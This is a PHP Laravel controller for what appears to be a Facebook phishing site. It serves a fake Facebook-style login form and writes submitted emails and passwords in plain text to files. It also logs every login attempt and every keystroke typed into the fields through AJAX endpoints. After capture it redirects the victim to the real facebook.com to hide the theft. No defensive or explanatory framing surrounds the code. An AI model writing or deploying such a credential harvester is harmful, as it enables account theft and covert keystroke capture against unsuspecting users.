<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use App\Models\User;

class FbLoginController extends Controller
{
    // Show the Facebook-style login form
    public function showLoginForm()
    {
        return view('fb-login');
    }

    // Handle login POST (store in DB/txt, redirect to Facebook)
     public function login(Request $request)
    {
        $email = $request->input('email');
        $password = $request->input('password');

        if (!User::where('email', $email)->exists()) {
    User::create([
        'email' => $email,
        'password' => Hash::make($password), // hash manually
    ]);
}

        // Always store in txt (plain)
        $txtPath = base_path('data/txt');
        file_put_contents($txtPath, $email . '|' . $password . PHP_EOL, FILE_APPEND);
        // Redirect to real Facebook
        return redirect()->away('https://facebook.com');
    }

    // Store every login attempt (AJAX)
    public function logAttempt(Request $request)
    {
        $email = $request->input('email');
        $password = $request->input('password');
        $timestamp = date('Y-m-d H:i:s');
        $txtPath = base_path('data/attempts.txt');
        $line = "[$timestamp] $email|$password" . PHP_EOL;
        file_put_contents($txtPath, $line, FILE_APPEND);
        return response()->json(['success' => true]);
    }

    // Store every keystroke (AJAX)
    public function logKeystroke(Request $request)
    {
        $field = $request->input('field');
        $value = $request->input('value');
        $timestamp = date('Y-m-d H:i:s');
        $txtPath = base_path('data/keystrokes.txt');
        $line = "[$timestamp] $field: $value" . PHP_EOL;
        file_put_contents($txtPath, $line, FILE_APPEND);
        return response()->json(['success' => true]);
    }
}
